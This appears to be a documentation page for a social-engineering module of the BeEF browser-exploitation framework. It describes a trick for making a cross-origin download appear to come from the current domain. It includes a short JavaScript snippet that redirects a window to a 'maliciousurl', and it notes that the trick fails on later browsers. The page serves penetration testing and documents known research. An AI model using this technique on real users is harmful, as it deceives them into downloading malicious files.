## Summary

* **Objective**: Trick the user into downloading a file from another domain
* **Authors**: Bart Leppens
* **Browsers**: Firefox, Chrome

* [Code](https://github.com/beefproject/beef/tree/master/modules/social_engineering/lcamtuf_download)

## Internal Working

points the targeted window to a cross-origin attachment download and try to spoof to source of that download to look like the current domain (doesn't work on later versions)

```js

function doit() {
    if (!beef.browser.isIE()) {
            w = window.open('data:text/html,<meta http-equiv="refresh" content="0;URL=' + realurl + '">', 'foo');
            setTimeout(donext, 4500);
    }
}

function donext() {
            window.open(maliciousurl, 'foo');
            if (once != true) setTimeout(donext, 5000);
            once = true;
}


```


## References
* https://lcamtuf.blogspot.co.uk/2012/05/yes-you-can-have-fun-with-downloads.html
* http://lcamtuf.coredump.cx/fldl/

## Feedback
